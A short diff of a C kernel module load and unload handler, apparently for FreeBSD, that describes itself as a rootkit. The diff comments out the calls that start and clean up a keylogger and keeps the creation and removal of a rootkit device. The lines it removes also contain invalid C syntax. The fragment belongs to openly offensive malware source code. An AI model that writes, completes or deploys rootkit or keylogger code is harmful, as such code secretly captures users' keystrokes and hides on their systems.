@@ -17,14 +17,18 @@ static int load(module_t module, int cmd, void *arg) {
         error = make_rk_dev();
         // if (error == 0)
         //     printf("rootkit: module loaded\n");
-		if error == 0 {
-			init_keylogger();
-		}
+        /* TODO: Fix this later
+            // if error == 0 {
+            // 	init_keylogger();
+            // }
+        */
 		// only be initial when device is successfully created
         break;
 
     case MOD_UNLOAD:
-		cleanup_keylogger(); 
+        /* TODO: Fix this later
+		    // cleanup_keylogger(); 
+        */
 		//uninstall hook first
         destroy_rk_dev();
         // printf("rootkit: module unloaded\n");
